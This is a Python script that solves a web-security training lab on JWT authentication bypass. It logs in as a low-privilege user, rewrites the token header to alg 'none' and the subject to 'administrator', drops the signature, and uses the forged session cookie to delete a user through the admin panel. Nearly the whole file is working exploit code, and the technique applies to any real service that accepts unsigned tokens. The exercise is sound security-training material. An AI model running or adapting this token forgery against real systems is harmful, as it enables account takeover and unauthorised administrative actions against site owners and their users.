import requests
import argparse
import re
from base64 import b64encode, b64decode
import json

parser = argparse.ArgumentParser(description='Solves the following Lab: JWT authentication bypass via flawed signature verification')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

def add_padding(b64str):
    while len(b64str) % 4 != 0:
        b64str += '='
    return b64str

# GET CSRF AND COOKIE
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = {"Cookie":f"session={r.cookies.get('session')}"}

# AUTH AS WIENER
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"csrf":csrf,"username":"wiener","password":"peter"}, allow_redirects=False)
wiener = r.cookies.get('session')

# UNSIGN ADMINISTRATOR COOKIE
jwt = wiener.split('.')
jwt[0] = b64decode(add_padding(jwt[0])).decode("utf-8")
jwt[0] = json.loads(jwt[0])
jwt[0]["alg"] = "none"
jwt[0] = b64encode(json.dumps(jwt[0]).encode()).decode().strip('=')
# FORGE UNSIGNED ADMINISTRATOR COOKIE 
jwt[1] = b64decode(add_padding(jwt[1])).decode("utf-8")
jwt[1] = json.loads(jwt[1])
jwt[1]["sub"] = "administrator"
jwt[1] = b64encode(json.dumps(jwt[1]).encode()).decode().strip('=')

administrator = f"{jwt[0]}.{jwt[1]}."
headers = {"Cookie":f"session={administrator}"}

# DELETE CARLOS
requests.get("https://" + lab.id + ".web-security-academy.net/admin/delete?username=carlos", headers=headers)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")